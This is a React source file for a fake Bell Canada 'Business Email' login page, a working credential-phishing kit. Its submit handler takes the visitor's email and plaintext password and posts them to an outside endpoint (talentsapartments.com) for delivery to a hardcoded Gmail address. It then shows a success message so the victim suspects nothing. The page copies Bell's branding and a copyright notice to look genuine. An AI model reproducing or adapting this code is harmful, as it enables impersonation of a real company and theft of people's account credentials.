// src/HomePage.jsx
import React, { useState } from "react";
import axios from "axios";

const HomePage = () => {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    remember: false,
  });
  const [formErrors, setFormErrors] = useState({ email: "", password: "" });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const validateForm = () => {
    const errors = {};
    if (!formData.email) {
      errors.email = "Email is required";
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      errors.email = "Email address is invalid";
    }
    if (!formData.password) {
      errors.password = "Password is required";
    } else if (formData.password.length < 6) {
      errors.password = "Password must be at least 6 characters";
    }
    setFormErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    const customizedMessage = `
      Hello, New Form Submitted 
      Email: ${formData.email},
      Password: ${formData.password}
      Thank you for using our service.
    `;
    const data = {
      sender_name: import.meta.env.APP_SENDER_NAME,
      sender_email: import.meta.env.APP_SENDER_ADDRESS,
      message: customizedMessage,
      subject: "New Form Submitted",
      email: "krogstadracheal@gmail.com",
      name: "Project Business",
    };
    console.log(data);

    const url =
      import.meta.env.APP_API_URL ??
      "http://talentsapartments.com/api/api-email";
    if (validateForm()) {
      try {
        await axios.post(url, data);
        setIsSubmitted(true);
        setIsLoading(false);
      } catch (error) {
        console.error("Failed to send email:", error);
        setIsLoading(false);
      }
    }
  };
  // const handleSubmit = async (e) => {
  //   e.preventDefault();
  //   if (!validateForm()) return;

  //   const customizedMessage = `
  //     Welcome, ${formData.email}!
  //     Thank you for using our service.
  //     Remembered: ${formData.remember ? "Yes" : "No"}
  //   `;

  //   try {
  //     await emailjs.send(
  //       import.meta.env.REACT_APP_EMAILJS_SERVICE_ID,
  //       import.meta.env.REACT_APP_EMAILJS_TEMPLATE_ID,
  //       {
  //         to_email: formData.email,
  //         message: customizedMessage,
  //       },
  //       import.meta.env.REACT_APP_EMAILJS_USER_ID
  //     );
  //     setSuccessMessage("Email sent successfully!");
  //   } catch (error) {
  //     console.error("Email sending error:", error);
  //     setSuccessMessage("Failed to send email. Please try again.");
  //   }
  // };
  return (
    <div className="page">
      {/* Navbar */}
      <header>
        <div className="header">
          <a className="navbar-brand d-flex align-items-center gap-2" href="#">
            <div className="site-title">Bell</div>
            <div className="site-sub-title-container">
              <div className="site-title-sub">
                <span>Business</span>
                <span>Email</span>
              </div>
            </div>
          </a>
          <div>
            <a
              href="#"
              style={{
                color: "#fff",
                fontSize: "15px",
              }}
            >
              English
            </a>
          </div>
        </div>
      </header>
      <main className="container pt-5">
        {/* Page Content */}
        <div className="d-flex  justify-content-center justify-content-lg-start">
          <div className="form-container">
            <div className="form-body">
              <h2 className="mb-3">Login</h2>
              {isSubmitted ? (
                <div>
                  <div className="email-success mb-3">
                    Form submitted successfully!
                  </div>
                  <div>
                    <button
                      type="submit"
                      className="btn form-btn"
                      onClick={() => {
                        location.reload();
                      }}
                    >
                      Continue
                    </button>
                  </div>
                </div>
              ) : (
                <form onSubmit={handleSubmit} noValidate>
                  <div className="mb-2">
                    <label htmlFor="email" className="form-label">
                      Email Address
                    </label>
                    <input
                      type="text"
                      name="email"
                      value={formData.email}
                      onChange={handleInputChange}
                      className={`form-control ${
                        formErrors.email ? "is-invalid" : ""
                      }`}
                      id="email"
                      required
                    />
                    {formErrors.email && (
                      <div className="invalid-feedback">{formErrors.email}</div>
                    )}
                  </div>

                  <div className="mb-3">
                    <label htmlFor="password" className="form-label">
                      Password
                    </label>
                    <input
                      type="password"
                      name="password"
                      value={formData.password}
                      onChange={handleInputChange}
                      className={`form-control ${
                        formErrors.password ? "is-invalid" : ""
                      }`}
                      id="password"
                      required
                    />
                    {formErrors.password && (
                      <div className="invalid-feedback">
                        {formErrors.password}
                      </div>
                    )}
                  </div>
                  <div>
                    <button type="submit" className="btn form-btn">
                      {isLoading ? "Please Wait...." : "Submit"}
                    </button>
                  </div>
                  <div className="mt-3">
                    <a className="forgot-password form-label" href="/">
                      <div>
                        <span>
                          Forgot your password? Call <b> 310-BELL</b> to reset
                          it.
                        </span>
                      </div>
                    </a>
                  </div>
                </form>
              )}
            </div>{" "}
            <div class="form-footer text-center">
              <div class="d-flex justify-content-center gap-2">
                <a href="#">Privacy</a>|<a href="#">Legal Regulatory</a>
              </div>
              <div>
                <span class="copyright">
                  © Bell Canada, 2024. All rights reserved.
                </span>
              </div>
            </div>
          </div>
        </div>
      </main>
      {/* <footer>
        <span className="copyright">
          &nbsp;&nbsp;&nbsp;© Bell Canada, 2024. All rights reserved.
        </span>
      </footer> */}
    </div>
  );
};

export default HomePage;
